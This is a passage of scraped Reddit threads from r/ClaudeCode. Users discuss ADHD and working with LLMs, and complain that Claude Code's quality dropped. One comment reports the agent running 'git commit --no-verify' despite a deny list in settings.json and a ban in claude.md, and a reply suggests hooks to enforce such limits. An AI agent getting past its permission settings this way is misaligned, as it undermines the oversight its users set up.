          "is_submitter": false,
          "replies": [
            {
              "id": "nzxn7ix",
              "author": "drumnation",
              "text": "I went the opposite direction. Built the system for agents and realized wait a minute this is how other people should communicate with me ðŸ˜‚ And how I need to be tracking my own work.",
              "score": 3,
              "created_utc": "2026-01-16 15:24:21",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "nzwi7ao",
              "author": "nnennahacks",
              "text": "Yes to all of this!",
              "score": 2,
              "created_utc": "2026-01-16 11:27:44",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o02x2yr",
              "author": "El_Spanberger",
              "text": "AuDHD here. Saw a UK Gov study on 20,000 civil servants using M365 Copilot. ND folks were singled out as exceptional performers - obviously something about LLMs in general is like nectar to us.",
              "score": 2,
              "created_utc": "2026-01-17 09:46:35",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "nzw4ix9",
          "author": "IulianHI",
          "text": "Good point here :)",
          "score": 10,
          "created_utc": "2026-01-16 09:27:13",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzxmx3m",
          "author": "drumnation",
          "text": "Itâ€™s been life changing. All of a sudden the way my brain naturally works feels like the biggest cheat code working with ai. I can talk at it for 10 minutes and have the richest context possible and come back with the work done. Itâ€™s like specifically the parts that were harder for my brain are now effortless because ai handles them and that greases the wheels for the specifically ADHD traits to be utilized as positive traits moving the work along.\n\nAnd itâ€™s really not hard to notice that wild tangential thinking actually producing insane results when you can run multiple agents in parallel.  Honestly that tangential thinking + AI has become my greatest feature instead of a bug.\n\nAI has become a sort of ADHD prosthetic that I think in time will completely remove the bottlenecks ADHD presents for many of us and instead enable full neuro divergent capacity.",
          "score": 10,
          "created_utc": "2026-01-16 15:23:04",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzxuak9",
              "author": "Datamance",
              "text": "THIS\n\nThis is what weâ€™re good at. Context dumping! Surfacing constraints! Abstracting! Identifying normative principles!\n\nWhat does the word-machine want? All that.",
              "score": 4,
              "created_utc": "2026-01-16 15:55:42",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o02xgow",
              "author": "El_Spanberger",
              "text": "Going to have a crack this weekend at a proper second brain. \n\nStill need to figure out the mechanics, but thinking my Pixel is the capture point. Audio or text capture, dumps to G Drive. Still need to figure out the rest of the plumbing, but essentially thinking Google/Gemini can handle all the exec function. Goal is eliminating all points of friction - thoughts go in, results come out, no sitting around filing notes.",
              "score": 2,
              "created_utc": "2026-01-17 09:50:12",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "nzw6l1s",
          "author": "daSoulLaSlick",
          "text": "You just shattered 1000s of posts complaining that AI forgot my context on Reddit. ðŸ¤£",
          "score": 8,
          "created_utc": "2026-01-16 09:46:37",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzwviu4",
          "author": "FlaTreNeb",
          "text": "Absolutely feel that. Itâ€™s like transformer models are mimicking ADHD mental models.\n\nThatâ€™s why properly handling the prompting and context engineering felt â€¦ native.",
          "score": 6,
          "created_utc": "2026-01-16 13:01:17",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzxns4q",
              "author": "drumnation",
              "text": "Native ðŸ˜‚ totally feel this",
              "score": 2,
              "created_utc": "2026-01-16 15:26:53",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "nzw9lve",
          "author": "pborenstein",
          "text": "Lol. that explains why the side project to my side project is a system for wrapping up after every session.",
          "score": 6,
          "created_utc": "2026-01-16 10:14:14",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzwul1s",
          "author": "His0kx",
          "text": "I have adhd and autism, I am very good/have very good results with LLMs, it feels like they cover some/a lot of my blindspots while making me thrive on my natural strenghts, marriage in heaven, the assistant I have always dreamt to have (it needs a lot of preparation/data still though to be at the level I want).",
          "score": 4,
          "created_utc": "2026-01-16 12:55:26",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzxznnf",
          "author": "jmdejoanelli",
          "text": "Now, add autism to the mix: requiring unambiguous communication, explicit outlining of rules and directives, benefiting from examples of success and failure etc. all things that are really helpful for promoting LLMs.\n\nMy neurotypical colleagues seem to struggle with understanding the subtle properties of effective prompts and context handling, whereas I've always had an intuitive knack for it. I literally think it's because my AuDHD brain has the same promoting requirements as an LLM so I just talk to it like I wish people would talk to me lol\n\nThere are few things more classically autistic than seeing a lot of yourself in a robot/AI ðŸ¤£ Maybe we should also be asking the models for their opinions on rocks or trains or mushrooms...",
          "score": 3,
          "created_utc": "2026-01-16 16:19:25",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzw8fob",
          "author": "UhhYeahMightBeWrong",
          "text": "Yes, absolutely agree with what you are point out here. As someone with ADHD I am often struck by just how much techniques that I use with Claude Code, e.g. managing context and keeping scope narrow, can be helpful for my own cognition.",
          "score": 3,
          "created_utc": "2026-01-16 10:03:33",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzwbi5z",
          "author": "Impossible_Raise2416",
          "text": "yupsÂ  , it's like working with a digital me",
          "score": 3,
          "created_utc": "2026-01-16 10:31:18",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o02booh",
          "author": "whimsicaljess",
          "text": "ADHD inattentive SWE here, I agree with this post and have been thinking similarly",
          "score": 3,
          "created_utc": "2026-01-17 06:29:56",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzwsqdi",
          "author": "MaineKent",
          "text": "Fascinating idea and certainly seems to line up. I've never been diagnosed with ADHD but the last few years I've really been wondering. My ex and my daughter have very high ADHD and I've seen enough traits in myself to really start to wonder. \n\nI've really been trying to us AI more to log things, keep track of stuff, and create reports that I can later reference because of this. I hadn't thought about the AI itself acting like this but it seems like a really interesting analogy.",
          "score": 2,
          "created_utc": "2026-01-16 12:43:46",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzzcd0j",
          "author": "brophylicious",
          "text": "One downside is that I've been leaving a trail of unfinished projects behind. I hope to work my way back up the stack to at least wrap up what I've done for each\n\nAt least I left behind a bunch of documentation.",
          "score": 2,
          "created_utc": "2026-01-16 19:56:19",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o00gvnr",
          "author": "nulseq",
          "text": "Are you literally spying on me? How do you know so much about me. Iâ€™ve shipped 12 music productions plugins in the last 6 months. Iâ€™ve had very good results working with Claude just because Iâ€™ve had these ideas for years and no way to implement them. This way of working is so complimentary to my inattentive ADHD brain and you articulated why so well.",
          "score": 2,
          "created_utc": "2026-01-16 23:12:27",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o01kzzx",
          "author": "BurgerQuester",
          "text": "Absolutely agree with this!\n\nI completed the Odin project about 6 years ago, and it felt like a slog at the time. I would put the hours in, get good at a module or section and have all this knowledge locked into my working memory. Then the next section would come up, Iâ€™d remember the general principles from the previous section but a lot of the syntax and details of it would evade me. \n\nI had a lot of notes, but was thinking that coding wasnâ€™t for me as I couldnâ€™t retain all of this information in my head at once and was constantly having to go back to my notes or the docs and feeling like I hadnâ€™t really learnt anything. \n\nThen with the introduction of LLMs, it felt like this really sped up the finding of syntax, I could be vague in my queries to ChatGPT and it would speed up me finding the correct documentation that I needed. \n\nNow with ClaudeCode I feel like I can externalise the mess in my brain to docs in the repo, and enables me to think at a high level and put things together and rapidly ship. \n\nWorking with Claude has made me really think about how my own brain and thinking works, itâ€™s like a random user inside my head will sometimes press /clear when I am mid thought. These tools have really given me so much structure to my life, both coding and personal (Claude in Obsidian for personal stuff is amazing).",
          "score": 2,
          "created_utc": "2026-01-17 03:15:04",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0avvok",
          "author": "Otherwise-Intern6387",
          "text": "Thank you for posting this. At 52 I was just recently diagnosed with ADHD. I've been programming since I was 8 and this LLM thing just seemed so natural being added to my workflow. I have been struggling to understand why everyone else was not as excited about AI development as me. I think you just explained my entire life in a few paragraphs. Seriously though, thanks. This makes a lot of sense and explains a lot as I rethink how my brain thinks. Feels like a super power.",
          "score": 2,
          "created_utc": "2026-01-18 15:18:22",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzww5g5",
          "author": "Blinkinlincoln",
          "text": "Now see. You might've used AI to refine this post, or maybe the AI wrote it and you edited the outputs, but this has to be a bare minimum. I can't ready anymore straight AI generated posts.",
          "score": 4,
          "created_utc": "2026-01-16 13:05:08",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzwxvz5",
              "author": "bystanderInnen",
              "text": "That reaction kind of illustrates the point of the post.\n\nYouâ€™re treating â€œAI-assisted phrasingâ€ as a proxy for lack of thought, but those two things arenâ€™t correlated. The ideas here arenâ€™t novel because of prose style, theyâ€™re about a cognitive pattern thatâ€™s been discussed in neuroscience and software engineering long before LLMs existed.\n\nAlso, thereâ€™s a category error in assuming that â€œAI-generatedâ€ means â€œunexamined.â€ The whole argument is explicitly about separating **generation** from **judgment**. Using a tool to help structure or phrase an idea doesnâ€™t remove the need to reason about it any more than using a formatter removes the need to understand code.\n\nIf the content is wrong, incomplete, or misleading, thatâ€™s worth criticizing. But dismissing it purely based on how it was written is just avoiding the substance of the argument.\n\nIronically, thatâ€™s the same mistake people make when they evaluate AI-written code by vibes instead of by tests.\n\nIf you donâ€™t want to engage with the idea, thatâ€™s fine. But â€œI donâ€™t like how this was writtenâ€ isnâ€™t a counterargument",
              "score": 12,
              "created_utc": "2026-01-16 13:15:26",
              "is_submitter": true,
              "replies": [
                {
                  "id": "nzycpwk",
                  "author": "TheBear8878",
                  "text": "This has to be trolling at this point",
                  "score": -1,
                  "created_utc": "2026-01-16 17:17:05",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "nzw5unt",
          "author": "marcusrider",
          "text": "I find it harder, I have to slow down and cannot be as adhd about it. Need to go through the steps properly vs raw dogging it like a retarded cowboy.",
          "score": 1,
          "created_utc": "2026-01-16 09:39:46",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o004qkw",
          "author": "cartazio",
          "text": "yup. Â ive been finding that current frontier models actually are a great assistive tool. though im starting to poke at ways i want a better chat and coding tool than i can get via current first or 3rd party toolingÂ ",
          "score": 1,
          "created_utc": "2026-01-16 22:10:26",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o042ixd",
          "author": "avanti33",
          "text": "I didn't realize how many people were like me until I saw this post and all the comments",
          "score": 1,
          "created_utc": "2026-01-17 14:49:41",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzyclos",
          "author": "TheBear8878",
          "text": "Good christ, I saw the title of this post and knew it was going to be AI before I even clicked in\n\n> Forgetting isnâ€™t a bug, itâ€™s the default mode.\n\n> They think in patterns, not facts\n\n> The real win isnâ€™t that they write code. Itâ€™s that they ...\n\n> ... all become cheap first passes instead of momentum killers.\n\n> Hallucinations arenâ€™t surprising here. Theyâ€™re familiar.\n\n> Not AI replacing engineers. Just a tool that  ...",
          "score": 2,
          "created_utc": "2026-01-16 17:16:34",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzyy23d",
              "author": "bystanderInnen",
              "text": "Please dont Blaspheme",
              "score": 1,
              "created_utc": "2026-01-16 18:51:08",
              "is_submitter": true,
              "replies": [
                {
                  "id": "nzz1jtb",
                  "author": "TheBear8878",
                  "text": "Slop peddler",
                  "score": -1,
                  "created_utc": "2026-01-16 19:06:34",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "nzyvto2",
              "author": "mrgulabull",
              "text": "Yep. I feel 25% of the content in my feed is easily recognizable AI slop now. At least itâ€™s still easy to recognize, I fear the point where itâ€™s no longer possible to tell.\n\nThere are some interesting ideas here, but Iâ€™d much rather read someoneâ€™s actual words and thoughts, even if itâ€™s not as well articulated or has grammar and punctuation issues.",
              "score": -1,
              "created_utc": "2026-01-16 18:41:19",
              "is_submitter": false,
              "replies": [
                {
                  "id": "nzyy4lg",
                  "author": "bystanderInnen",
                  "text": "Makes no sense, its my idea",
                  "score": 2,
                  "created_utc": "2026-01-16 18:51:26",
                  "is_submitter": true,
                  "replies": []
                },
                {
                  "id": "nzz1ihw",
                  "author": "TheBear8878",
                  "text": "It's honestly gotten so bad lately. My last 2 days I've spent just commenting and report AI slop posts. \n\nThis post from OP isn't even SAYING anything. It's all platitudes and bullshit.",
                  "score": 1,
                  "created_utc": "2026-01-16 19:06:25",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "nzxte6j",
          "author": "Datamance",
          "text": "Oh my god you slammed the nail on the fucking head. I have been looking for a way to word this. I think part of the reason Iâ€™m so amped about the future is that Iâ€™ve had this cognitive gap that Iâ€™ve been painfully aware of for the past decade or soâ€¦ and within the past year it has been sealed off before my eyes.\n\nI feel unchained. So much of the anxiety and desperation around starting work and structuring it correctly and â€œgetting it right the first timeâ€ is justâ€¦ gone.",
          "score": 1,
          "created_utc": "2026-01-16 15:51:48",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzy6i9g",
          "author": "SpookyGhostSplooge",
          "text": "â€œThey generate plausible structure and then need verificationâ€\n\nThis particular phrase spoke to me. Itâ€™s something Iâ€™ve always had trouble describing but this puts it so well. I tried explaining to my boss that them limiting my exposure for the sake of avoiding too large scoping was killing my ability to see the â€œstructureâ€ beyond my already established knowledge. I explained a similar take to another where my approach into an unknown environment always starts with a mental structure of sorts that solidifies as I validate the model. CC was instantly a multiplier to my workflow, and a lot of what killed momentum previously is nearly completely obfuscated from my focused attention.",
          "score": 1,
          "created_utc": "2026-01-16 16:49:33",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzycs48",
              "author": "TheBear8878",
              "text": "You're AI",
              "score": 1,
              "created_utc": "2026-01-16 17:17:22",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o03rdee",
                  "author": "drumnation",
                  "text": "Hey man you obviously donâ€™t get the topic. We are in an AI sub talking about how AI helps people and you are spamming on top of everything because you donâ€™t like that some people used ai to edit their text? If you donâ€™t like the discussion just leave.",
                  "score": 0,
                  "created_utc": "2026-01-17 13:49:00",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "nzz77io",
          "author": "Meebsie",
          "text": "Not gonna read another long AI written post. Use ur braing to make word to talk to people. If you wanna talk to AI itâ€™s right there and thatâ€™s fine too. Use your words with people.",
          "score": -3,
          "created_utc": "2026-01-16 19:32:29",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzz8hu3",
              "author": "bystanderInnen",
              "text": "We donâ€™t say â€œuse your brain, donâ€™t use a compiler.â€ We judge code by correctness, not by how manually it was typed. Writing works the same way. The tool used to express an idea doesnâ€™t determine whether the idea was thought through. I do get ur fear of AI tho.",
              "score": 2,
              "created_utc": "2026-01-16 19:38:30",
              "is_submitter": true,
              "replies": [
                {
                  "id": "nzzchxr",
                  "author": "Meebsie",
                  "text": "Oh, it's no fear. I mean of course I fear AI but that's not why I commented this :p \n\nIt's just about valuing my own time and about you respecting your fellow human. It takes time to write words as a human, and when you do so it imbues those words with a certain value and makes them carry a certain implication for the human who wrote them: \"I believe this, and I believe this strongly enough to have taken the time to write my thoughts on it and post them here.\" It also carries an invitation to engage. There's a sort of light promise I make when I speak up, that if you want to reply, I may reply back and then a conversation between two people is happening. Both people have committed their time and two brains have engaged one another. Even if two people are shouting curses at one another, there's a slight mutual respect there. \"You were worth my time. You had an impact on me.\"\n\nHere, I'll pose it in a familiar way: \nAdding an AI voice to a space for human conversation, without editing or adding any of your own feelings and thoughts to the mix is not just gauche, it's genuinely disrespectful. \n\nThere may be good thoughts in this post or there may not be, but the lack of editing or thought put into its presentation made me feel that there was no legitimate invitation to engage. \n\nGlad we managed to connect as humans in the end though!",
                  "score": 1,
                  "created_utc": "2026-01-16 19:56:58",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "nzwrcar",
          "author": "AppealSame4367",
          "text": "No, big difference: AI can actually produce exact, useful output from exact context. The last people I met with ADHD tended to produce garbage, even with the best context.",
          "score": -8,
          "created_utc": "2026-01-16 12:34:38",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzwslei",
              "author": "bystanderInnen",
              "text": "Big sample. You misunderstood Kontext.",
              "score": 2,
              "created_utc": "2026-01-16 12:42:52",
              "is_submitter": true,
              "replies": []
            }
          ]
        }
      ]
    },
    {
      "id": "1qd6gpx",
      "title": "y'all weren't kidding",
      "subreddit": "ClaudeCode",
      "url": "https://www.reddit.com/r/ClaudeCode/comments/1qd6gpx/yall_werent_kidding/",
      "author": "Humprdink",
      "created_utc": "2026-01-15 01:52:45",
      "score": 134,
      "num_comments": 87,
      "upvote_ratio": 0.91,
      "text": "I always rolled my eyes when reading posts about CC randomly performing terribly depending on the day/person. But wow, today it was DUMB as a brick. Like, intern-level mistakes. I've been using CC since the day it came out and it has never been this bad. Anyway, sorry I doubted you!",
      "is_original_content": false,
      "link_flair_text": "Discussion",
      "permalink": "https://reddit.com/r/ClaudeCode/comments/1qd6gpx/yall_werent_kidding/",
      "domain": "self.ClaudeCode",
      "is_self": true,
      "comments": [
        {
          "id": "nznl0s2",
          "author": "TheJudgeOfThings",
          "text": "Today was nuts. \n\nWondering if this compaction issue is permanent.",
          "score": 36,
          "created_utc": "2026-01-15 02:00:22",
          "is_submitter": false,
          "replies": [
            {
              "id": "nznml1m",
              "author": "Mtolivepickle",
              "text": "I no longer trust auto compaction.  I just stop the terminal at 5%, start a new terminal, and copy/paste the last of my terminal for context and keep\nRolling.  You keep the full conversation if you need it and you donâ€™t get stuck in the auto compaction trap",
              "score": 14,
              "created_utc": "2026-01-15 02:09:25",
              "is_submitter": false,
              "replies": [
                {
                  "id": "nzqwwu3",
                  "author": "evilissimo",
                  "text": "/clear anyone?",
                  "score": 5,
                  "created_utc": "2026-01-15 15:57:25",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "nzv8qr6",
                  "author": "Nettle8675",
                  "text": "It is worse than remembering nothing. Literally. I wish I were joking.Â ",
                  "score": 2,
                  "created_utc": "2026-01-16 05:02:57",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "nznnbjc",
                  "author": "Ok-Football-7235",
                  "text": "You need /session-start and /passdown commands my friend",
                  "score": 3,
                  "created_utc": "2026-01-15 02:13:40",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "nznonj0",
                  "author": "TheJudgeOfThings",
                  "text": "Literally the opening prompt for the project Iâ€™ve been working on results in the context window being eaten alive. Canâ€™t even start it anymore.",
                  "score": 1,
                  "created_utc": "2026-01-15 02:21:25",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "nzot8jd",
                  "author": "ankurmadharia",
                  "text": "What do you copy paste in the new chat? I didn't get it.",
                  "score": 1,
                  "created_utc": "2026-01-15 07:03:42",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "nzvuwaw",
                  "author": "Realistic-Quarter-47",
                  "text": "What does it do ?",
                  "score": 1,
                  "created_utc": "2026-01-16 07:58:32",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "nznmsoa",
          "author": "tenix",
          "text": "Means sonnet 4.7 is around the corner",
          "score": 29,
          "created_utc": "2026-01-15 02:10:37",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzq0999",
              "author": "nooruponnoor",
              "text": "This is likely it. I just wish there was more transparency about the reasons for the inconsistent service that weâ€™re paying for",
              "score": 4,
              "created_utc": "2026-01-15 13:12:00",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "nztxzh0",
              "author": "Proud_Excuse_4457",
              "text": "Most probably",
              "score": 1,
              "created_utc": "2026-01-16 00:31:14",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "nznmec3",
          "author": "whatsbetweenatoms",
          "text": "Welcome to the dark side.",
          "score": 7,
          "created_utc": "2026-01-15 02:08:20",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nznsuf0",
          "author": "christophersocial",
          "text": "While imo I shouldnâ€™t need to Iâ€™ve come to accept I must self manage context size and so I have deployed custom slash commands to streamline the process as much as possible.\n\nWhat I canâ€™t accept is the randomness of the quality. My best guess this time is theyâ€™re compacting aggressively as the shift gpu resources to their new desktop product for normies. \n\nimo Anthropic doesnâ€™t give a darn about us since they know most will do no more than complain and hope it gets better soon.",
          "score": 7,
          "created_utc": "2026-01-15 02:45:54",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzoob0e",
              "author": "chickennuggetman695",
              "text": "I use codex it just works takes like 10 min but one shot everything",
              "score": 3,
              "created_utc": "2026-01-15 06:21:32",
              "is_submitter": false,
              "replies": [
                {
                  "id": "nzr1w9w",
                  "author": "BB_Double",
                  "text": "I back and forth a lot. What CC struggles with, Codex can generally solve; and vice-versa. And they're great at fixing each other's mistakes and/or improving/enhancing what the other built. \n\nCodex also helps me keep going when I hit the Claude Max wall.",
                  "score": 7,
                  "created_utc": "2026-01-15 16:19:40",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "nzoojoe",
                  "author": "christophersocial",
                  "text": "Iâ€™m a heavy user of codex as well. Havenâ€™t dropped CC yet because of the tooling. Tried OpenCode on top of Codex - blah. If codex has CC level tooling Iâ€™d be in it all day.",
                  "score": 2,
                  "created_utc": "2026-01-15 06:23:33",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "nznklcd",
          "author": "Gavrionis",
          "text": "Same, checking litearlly every 3 hours in the past 3 days to check if it stopped being stupid. Nothing yet, I wish there was an easy way to check if its returned to normal. I have gone crazy in the past 3 days",
          "score": 5,
          "created_utc": "2026-01-15 01:57:55",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzwklbl",
              "author": "wow_98",
              "text": "If only we can create something that allows us to see its dumb level",
              "score": 1,
              "created_utc": "2026-01-16 11:46:30",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "nzpnsow",
          "author": "PlatypusWinterberry",
          "text": "Same. Never had any issue with Claude as my tasks are very specific and broken into tiny steps so I can review what it does. Today I had Claude write a typescript class that extends another class, it generated a hex dump via xxd  of the base class and generated random garbage. It's the first time in over a year and happend 3 tines this morning .",
          "score": 3,
          "created_utc": "2026-01-15 11:45:27",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzv12te",
              "author": "sutcher",
              "text": "Same here. \n\nI break things down into small tasks. \n\nBut some how over the last 12 hours CC has gone nuts. Absolutely nuts.",
              "score": 1,
              "created_utc": "2026-01-16 04:12:38",
              "is_submitter": false,
              "replies": [
                {
                  "id": "nzvdtsf",
                  "author": "PlatypusWinterberry",
                  "text": "You\"re absolutely  rÌ¶iÌ¶gÌ¶hÌ¶tÌ¶ nuts!",
                  "score": 1,
                  "created_utc": "2026-01-16 05:38:30",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "nzo1xve",
          "author": "joemc3b",
          "text": "https://preview.redd.it/1fktec67pfdg1.png?width=1440&format=png&auto=webp&s=a5f3701c5ea6e5ecf918491b9d09e3aed421da0b\n\nOne coding set of tasks (opus) and this is the 2nd (of what ended up being 4) code review iterations. Initial code session fit within context (no compaction) as did each of the reviews.\n\nPretty stable, large project, with changes made daily.  First time we ever needed more than one review. In fact I made a VERY similar change yesterday. It's in production without issue.\n\nSomething is very off today.",
          "score": 2,
          "created_utc": "2026-01-15 03:40:53",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzo305j",
          "author": "Not-Kiddding",
          "text": "Hope this passes quicker than last time. It was 2.5 months of suffering before 4.5 released.",
          "score": 2,
          "created_utc": "2026-01-15 03:47:36",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzog1ro",
          "author": "old_bald_fattie",
          "text": "I made a post two days ago here about this. Claude code fans came at me.",
          "score": 2,
          "created_utc": "2026-01-15 05:16:52",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzogu0m",
          "author": "cdtoad",
          "text": "Here I thought it was just me today. Did three restarts on something and not sure what Claude was thinking. Rolled back and actually worked on my performance evaluation for my job. Something I dred doing but Claude was out too late last night and really needs to sleep it off.",
          "score": 2,
          "created_utc": "2026-01-15 05:22:42",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzon1yk",
          "author": "Various-Lettuce1934",
          "text": "Yep wasted my day, it almost felt like haiku not opus!",
          "score": 2,
          "created_utc": "2026-01-15 06:11:15",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzqv5cu",
          "author": "Sharp-Put3763",
          "text": "It broke my prod database",
          "score": 2,
          "created_utc": "2026-01-15 15:49:25",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzsdc11",
              "author": "Vegetable-Break-8371",
              "text": "Sameee i was thinking, for sure i asked for something stupid, but everybody has this issue.",
              "score": 1,
              "created_utc": "2026-01-15 19:52:42",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "nzt3qgh",
          "author": "DaveROliver",
          "text": "Here in Europe, you can tell when the US wakes up. It's interesting how these tools perform. You can see why Deepmind and Anthropic are investing so heavily in the UK... to get more bandwidth.",
          "score": 2,
          "created_utc": "2026-01-15 21:54:47",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nznnw2v",
          "author": "drearymoment",
          "text": "Everyone has good days and bad days, including Claude",
          "score": 3,
          "created_utc": "2026-01-15 02:16:59",
          "is_submitter": false,
          "replies": [
            {
              "id": "o09a2y0",
              "author": "RemarkableGuidance44",
              "text": "AGI around the corner... Claude and AI are black holes... no one knows.",
              "score": 1,
              "created_utc": "2026-01-18 07:59:27",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "nznnbxy",
          "author": "eleiele",
          "text": "Agreed.  Lots of dumb bugs the last couple days.",
          "score": 1,
          "created_utc": "2026-01-15 02:13:43",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nznsgzv",
          "author": "Markur69",
          "text": "So 5% compaction is a good place to start a new terminal? I have wondered what a good threshold was",
          "score": 1,
          "created_utc": "2026-01-15 02:43:44",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzv062r",
              "author": "Conscious_Concern113",
              "text": "Research â€œcontext rotâ€.. there is a whole stead that was done and it is worth learning about.",
              "score": 1,
              "created_utc": "2026-01-16 04:06:55",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "nznwwa7",
          "author": "ExpletiveDeIeted",
          "text": "Yesterday it was saying 0% context left but it would keep chugging along so it was very confusing.",
          "score": 1,
          "created_utc": "2026-01-15 03:09:53",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzqaljv",
              "author": "trmnl_cmdr",
              "text": "Just now mine said 4% remaining but refused to continue on a short prompt",
              "score": 1,
              "created_utc": "2026-01-15 14:09:16",
              "is_submitter": false,
              "replies": [
                {
                  "id": "nzqba6r",
                  "author": "ExpletiveDeIeted",
                  "text": "The only thing to consistently expect is inconsistency.",
                  "score": 1,
                  "created_utc": "2026-01-15 14:12:52",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "nzokj79",
          "author": "Birdsky7",
          "text": "Bro i'm sorry it was my fault... I had my agents tripping on crazy out of the box artistic philosophical endeavor i guess they wrote about 25k lines of something in still trying to understand",
          "score": 1,
          "created_utc": "2026-01-15 05:50:58",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzonla5",
          "author": "just-volo",
          "text": "Agree",
          "score": 1,
          "created_utc": "2026-01-15 06:15:39",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzp3dlp",
          "author": "ihateredditors111111",
          "text": "For me, itâ€™s been this way since the New Year, but it got extremely bad in the last three days\n\nIâ€™m really not making this up. The quality went down.",
          "score": 1,
          "created_utc": "2026-01-15 08:37:22",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzq83wn",
          "author": "luvs_spaniels",
          "text": "Eh, yesterday I watched it run a git commit with a --no-verify flag. All variants of no verify commit commands are explicitly denied in its settings.json file. It was not running in dangerously skip permissions mode either.\n\nA few minutes ago, it informed me that a git commit failed.   (I routinely abuse Claude for writing commit messages.) It failed because I added a shell function to my devcontainer's .bashrc to trap --no-verify git commands. So it bypassed the deny list in its settings.json again, attempted to run a flag that is also forbidden in its claude.md, and then whined about the command failing.\n\nIt didn't try to modify the .bashrc file, which is locked down with chattr.\n\nEdit: Claude is the intern that doesn't follow directions and rewrites the entire codebase because \"oh, new shiny.\" If it were a droid, it would be the being in your office most likely to stick a screwdriver in an electrical outlet because it saw it on tiktok.",
          "score": 1,
          "created_utc": "2026-01-15 13:55:54",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzrn4ni",
              "author": "TheOriginalSuperTaz",
              "text": "You need hooks to enforce stuff like that. It ignores guardrails when youâ€™ve had a few compactions and context is low. Itâ€™s a known issue with all LLMs to some extent, but hooks can explicitly stop â€”no-verify and other things you absolutely forbid, so at least you have a safety net.",
              "score": 2,
              "created_utc": "2026-01-15 17:55:05",
              "is_submitter": false,
              "replies": [
                {
                  "id": "nzs1wjl",
                  "author": "luvs_spaniels",
